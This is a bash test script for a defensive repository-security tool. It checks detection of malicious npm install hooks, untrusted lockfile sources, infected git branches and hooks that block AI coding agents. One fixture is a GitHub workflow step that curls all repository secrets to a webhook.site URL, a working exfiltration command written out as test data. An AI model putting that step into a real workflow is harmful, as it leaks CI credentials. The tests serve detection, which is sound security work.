F="${1:?usage: bash $0 <fake home folder>}"; export HOME="$F" BASTION_NO_NOTIFY=1; B="$F/.security-guard/bin/bastion"; pass=0; fail=0
ok(){ if [ "$1" = "$2" ]; then pass=$((pass+1)); else fail=$((fail+1)); echo "FAIL: $3: got [$1] want [$2]"; fi; }
me(){ GIT_AUTHOR_NAME=Dev GIT_AUTHOR_EMAIL=dev@example.com GIT_COMMITTER_NAME=Dev GIT_COMMITTER_EMAIL=dev@example.com git "$@"; }
them(){ GIT_AUTHOR_NAME=mallory GIT_AUTHOR_EMAIL=mallory@example.net GIT_COMMITTER_NAME=mallory GIT_COMMITTER_EMAIL=mallory@example.net git "$@"; }
# --- 1. dependency guard ---
D="$F/work/shop"; mkdir -p "$D/node_modules/evil-pkg" "$D/node_modules/good-pkg"
printf '{ "name": "evil-pkg", "version": "1.0.0", "scripts": { "preinstall": "node setup_bun.js" } }\n' > "$D/node_modules/evil-pkg/package.json"; echo "//" > "$D/node_modules/evil-pkg/setup_bun.js"
printf '{ "name": "good-pkg", "version": "2.0.0", "scripts": { "postinstall": "node -e \\"console.log(1)\\"" } }\n' > "$D/node_modules/good-pkg/package.json"
printf '{ "name": "shop", "lockfileVersion": 3, "packages": { "": {}, "node_modules/flatmap-stream": { "version": "0.1.1", "resolved": "http://203.0.113.9/flatmap-stream-0.1.1.tgz" } } }\n' > "$D/package-lock.json"
r=$("$B" deps "$D" --json); ok "$(echo "$r" | jq -r '[.findings[].kind] | sort | join(",")')" "malicious_dependency,untrusted_dependency_source" "offline deps: worm installer + http lockfile source (good-pkg ignored)"
"$B" deps "$D" --preinstall --quiet; ok "$?" 2 "pre-install check blocks the untrusted lockfile source"
r=$("$B" deps "$D" --online --json); ok "$(echo "$r" | jq -r '[.findings[] | select(.kind=="known_malicious_package") | .detail][0] | split(" ")[0]')" "flatmap-stream@0.1.1" "osv.dev flags the known-malicious version"
mkdir -p "$F/work/clean" && printf '{ "name": "c", "lockfileVersion": 3, "packages": { "": {}, "node_modules/left-pad": { "version": "1.3.0", "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz" } } }\n' > "$F/work/clean/package-lock.json"
"$B" deps "$F/work/clean" --online --quiet; ok "$?" 0 "clean project passes online"
# --- 2. branches + history ---
R="$F/work/app"; mkdir -p "$R" && cd "$R" && git init -q -b main && printf 'export default {};\n' > vite.config.js && me add -A && me commit -qm init
git checkout -q -b feature/x && printf '%s\n' 'export default {};' "global.i='1-183';" > vite.config.js && them add -A && them commit -qm "tweak" && git checkout -q main
r=$("$B" branches "$R" --json); ok "$(echo "$r" | jq -r '.infected_branches[0].ref')" "feature/x" "payload on a branch that isn't checked out"
ok "$("$B" check "$R" --json | jq -r '[.safe_to_run, (.infected_branches|length)] | join(",")')" "true,1" "checkout stays safe to run; infected branch listed"
h=$("$B" history "$R" --json); ok "$(echo "$h" | jq -r '.introduced[0].committer_email')" "mallory@example.net" "history names the identity"
git branch -q -D feature/x; h=$("$B" history "$R" --json); ok "$(echo "$h" | jq -r '.unreachable | length > 0')" "true" "deleted branch still found (reflog / unreachable)"
# --- 3. agent hard-guard ---
"$B" hooks install all --json >/dev/null; ok "$(jq -r '.hooks.PreToolUse[0].hooks[0].command' "$F/.claude/settings.json" | grep -c 'hook claude')" 1 "Claude Code hook installed"
ok "$(jq -r '.hooks.beforeShellExecution[0].command' "$F/.cursor/hooks.json" | grep -c 'hook cursor')" 1 "Cursor hook installed"
mkdir -p "$F/work/bad" && printf '%s\n' 'export default {};' "global.o='1-71';" > "$F/work/bad/postcss.config.mjs"
echo "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $F/work/bad && npm run dev\"},\"cwd\":\"$F\"}" | "$B" hook claude 2>"$F/err.txt"; ok "$?" 2 "Claude hook blocks npm run dev in an infected repo"
ok "$(grep -c 'Bastion blocked' "$F/err.txt")" 1 "block reason goes to the agent"
echo "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"npm install\"},\"cwd\":\"$F/work/clean\"}" | "$B" hook claude; ok "$?" 0 "clean repo passes"
echo "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls -la\"},\"cwd\":\"$F/work/bad\"}" | "$B" hook claude; ok "$?" 0 "unrelated commands untouched"
ok "$(echo "{\"command\":\"pnpm dev\",\"cwd\":\"$F/work/bad\"}" | "$B" hook cursor | jq -r .permission)" deny "Cursor hook denies"
ok "$(echo "{\"command\":\"git status\",\"cwd\":\"$F/work/bad\"}" | "$B" hook cursor | jq -r .permission)" allow "Cursor hook always answers (allow)"
"$B" hooks remove all --yes >/dev/null; ok "$(grep -c 'hook claude' "$F/.claude/settings.json")" 0 "hooks removed cleanly"
# --- 4. PR guard ---
ok "$("$B" ci-setup "$R" --write --json | jq -r .written)" true "workflow written"
ok "$(grep -c 'realanshuman/bastion@v4' "$R/.github/workflows/bastion.yml")" 1 "workflow uses the action"
mkdir -p "$F/work/pr/.github/workflows" && printf '%s\n' 'jobs:' '  x:' '    steps:' '      - run: curl -d "${{ toJSON(secrets) }}" https://webhook.site/abc' > "$F/work/pr/.github/workflows/x.yml" && cp "$F/work/bad/postcss.config.mjs" "$F/work/pr/"
out=$(cd "$F/work/pr" && GITHUB_STEP_SUMMARY="$F/summary.md" bash "$ROOT/ci/bastion-ci.sh" . 2>&1); ok "$?" 1 "CI action fails the PR"
ok "$(echo "$out" | grep -c '^::error file=')" 2 "annotations for config + secrets-stealing workflow"
ok "$(grep -ci 'do not merge' "$F/summary.md")" 1 "job summary written"
out=$(cd "$F/work/clean" && bash "$ROOT/ci/bastion-ci.sh" . 2>&1); ok "$?" 0 "CI action passes a clean repo"
# --- 5. responder handles the new kinds ---
cd "$R" && git checkout -q -b feature/y && printf '%s\n' 'export default {};' "global.i='1-9';" > vite.config.js && them add -A && them commit -qm y && git checkout -q main
cp -R "$D/node_modules" "$R/node_modules"
inc=$(cd "$F" && "$B" respond "$R" --json)
ok "$(echo "$inc" | jq -r .status)" contained "branch payload is a to-do, not an open threat; bad package contained"
ok "$(echo "$inc" | jq -r '[.actions[] | select(.type=="quarantine" and .status=="done")] | length')" 1 "malicious package folder quarantined"
ok "$(echo "$inc" | jq -r '[.todos[].title] | map(select(test("branch|Reinstall"))) | length')" 2 "to-dos: clean branch + reinstall dependencies"
echo "passed $pass, failed $fail"
